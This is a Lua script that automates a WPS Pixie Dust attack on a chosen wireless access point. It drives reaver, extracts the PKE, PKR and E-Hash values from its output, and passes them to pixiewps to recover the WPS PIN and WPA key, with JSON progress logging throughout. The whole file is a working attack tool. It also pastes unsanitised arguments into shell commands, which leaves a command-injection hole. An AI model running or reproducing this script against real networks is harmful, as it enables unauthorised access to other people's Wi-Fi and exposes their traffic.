local bssid = arg[1]
local iface = arg[2]
local output_dir = arg[3] or "/tmp/pixie_" .. bssid:gsub(":", "")

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":' .. json_escape(bssid) .. ',"ssid":"","channel":"","data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local f = io.popen("iw dev " .. iface .. " info 2>/dev/null")
  if not f then return false end
  local out = f:read("*a")
  f:close()
  return out:find("type monitor") ~= nil
end

local function ensure_output_dir()
  os.execute("mkdir -p " .. output_dir)
  telemetry("output_dir", '{"dir":' .. json_escape(output_dir) .. '}')
end

local function run_reaver_pixie()
  local cmd = "reaver -i " .. iface .. " -b " .. bssid .. " -c 1 -vvv -K 1 -L -N -f 2>/dev/null"
  telemetry("pixie_start", '{"cmd":' .. json_escape(cmd) .. '}')
  local f = io.popen(cmd, "r")
  if not f then
    telemetry("pixie_fail", '{"error":"Failed to start reaver"}')
    return nil
  end
  local output = {}
  local pke, pkr, ehash1, ehash2
  for line in f:lines() do
    table.insert(output, line)
    if line:find("PKE") then pke = line:match("[%x]+") or line:match("%[([%x]+)%]") end
    if line:find("PKR") then pkr = line:match("[%x]+") or line:match("%[([%x]+)%]") end
    if line:find("E%-Hash1") or line:find("E-Hash1") then ehash1 = line:match("[%x]+") or line:match("%[([%x]+)%]") end
    if line:find("E%-Hash2") or line:find("E-Hash2") then ehash2 = line:match("[%x]+") or line:match("%[([%x]+)%]") end
    if line:find("WPA PSK") or line:find("WPA key") then
      local key = line:match('"([^"]+)"')
      if key then
        telemetry("pixie_key", '{"wpa_key":' .. json_escape(key) .. '}')
      end
    end
    if line:find("%d+%.%d+%%") then
      local p = line:match("(%d+%.%d+)%%")
      if p then telemetry("pixie_progress", '{"progress":' .. tostring(p) .. '}') end
    end
  end
  f:close()
  local full = table.concat(output, "\n")
  if not pke then pke = full:match("PKE[=:]-([%x]+)") end
  if not pkr then pkr = full:match("PKR[=:]-([%x]+)") end
  if not ehash1 then ehash1 = full:match("E%-Hash1[=:]-([%x]+)") or full:match("E-Hash1[=:]-([%x]+)") end
  if not ehash2 then ehash2 = full:match("E%-Hash2[=:]-([%x]+)") or full:match("E-Hash2[=:]-([%x]+)") end
  return {pke = pke, pkr = pkr, ehash1 = ehash1, ehash2 = ehash2, output = full}
end

local function save_params(params)
  if not params then return end
  local f = io.open(output_dir .. "/params.txt", "w")
  if f then
    f:write("PKE=" .. (params.pke or "") .. "\n")
    f:write("PKR=" .. (params.pkr or "") .. "\n")
    f:write("E-Hash1=" .. (params.ehash1 or "") .. "\n")
    f:write("E-Hash2=" .. (params.ehash2 or "") .. "\n")
    f:close()
    telemetry("params_saved", '{"file":' .. json_escape(output_dir .. "/params.txt") .. '}')
  end
end

local function run_pixiewps(params)
  if not params or not params.pke then
    telemetry("pixiewps_skip", '{"message":"No PKE parameter extracted"}')
    return nil
  end
  local cmd = "pixiewps --pke " .. (params.pke or "") .. " --pkr " .. (params.pkr or "")
  if params.ehash1 then cmd = cmd .. " --e-hash1 " .. params.ehash1 end
  if params.ehash2 then cmd = cmd .. " --e-hash2 " .. params.ehash2 end
  cmd = cmd .. " 2>/dev/null"
  telemetry("pixiewps_start", '{"cmd":' .. json_escape(cmd) .. '}')
  local f = io.popen(cmd, "r")
  if not f then
    telemetry("pixiewps_fail", '{"error":"Failed to run pixiewps"}')
    return nil
  end
  local out = f:read("*a")
  f:close()
  local pin = out:match("WPS PIN[=:]-([%d]+)")
  local psk = out:match("WPA PSK[=:]-([%x]+)")
  telemetry("pixiewps_result", '{"pin":' .. json_escape(pin or "") .. ',"psk":' .. json_escape(psk or "") .. ',"output":' .. json_escape(out:sub(1, 500)) .. '}')
  return {pin = pin, psk = psk}
end

if not bssid or not iface then
  telemetry("error", '{"error":"Usage: wps_pixie.lua <bssid> <interface> [output_dir]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Monitor mode required on ' .. iface .. '"}')
  os.exit(1)
end

local ok, err = pcall(function()
  ensure_output_dir()
  local params = run_reaver_pixie()
  if params then
    save_params(params)
    run_pixiewps(params)
  end
end)

if not ok then
  telemetry("error", '{"error":' .. json_escape(tostring(err)) .. '}')
  os.exit(1)
end

telemetry("complete", '{"output_dir":' .. json_escape(output_dir) .. '}')
